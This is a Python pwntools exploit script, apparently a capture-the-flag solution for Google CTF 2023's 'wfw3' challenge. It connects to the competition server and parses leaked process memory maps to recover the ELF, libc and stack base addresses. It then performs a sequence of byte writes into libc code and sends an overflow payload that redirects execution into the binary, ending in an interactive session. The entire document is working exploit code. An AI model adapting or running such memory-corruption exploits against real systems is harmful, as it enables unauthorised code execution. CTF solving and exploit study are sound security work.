from pwn import *
import time

elf = ELF("./chal")
libc = ELF("./libc.so.6")

context.binary = elf
context.log_level = 'DEBUG'

p = remote('wfw3.2023.ctfcompetition.com', '1337')

def write(addr, len):
    #p.stdout.write(f'0x{addr:x} {len}\n'.encode())
    p.sendline(f'0x{addr:x} {len}'.encode())
    time.sleep(1)

libc_found = False
elf_found = False
while True:
    line = p.recvline().decode('ascii').strip()
    if 'chal' in line and not elf_found:
        elf_base = int(line.split()[0].split('-')[0], 16)
        elf_found = True

    if line.endswith('libc.so.6') and not libc_found:
        libc_base = int(line.split()[0].split('-')[0], 16)
        libc_found = True

    if line.endswith('[stack]'):
        stack_bottom = int(line.split()[0].split('-')[1], 16)
        break

print(hex(elf_base))
print(hex(libc_base))
print(hex(stack_bottom))

input_buf_offset = 5856

for i in range(0x1149b2, 0x1149b7):
    write(libc_base + i, 1)

for i in range(0x114a08, 0x114a0f):
    write(libc_base + i, 1)

write(libc_base + 0x114a60, 1)

write(libc_base + 0x1149cf, 4)
write(libc_base + 0x1149ce, 4)

write(libc_base + 0x114a1c, 1)
write(libc_base + 0x1149c0, 1)

write(libc_base + 0x11499f, 1)
write(libc_base + 0x11499e, 1)
write(libc_base + 0x11499d, 1)
write(libc_base + 0x11499c, 1)
write(libc_base + 0x11499b, 1)
write(libc_base + 0x11499a, 1)
p.send(("a"*0x13).encode()+p64(elf_base + 0x50a0))
time.sleep(1)
p.send(b"CT")

p.interactive()

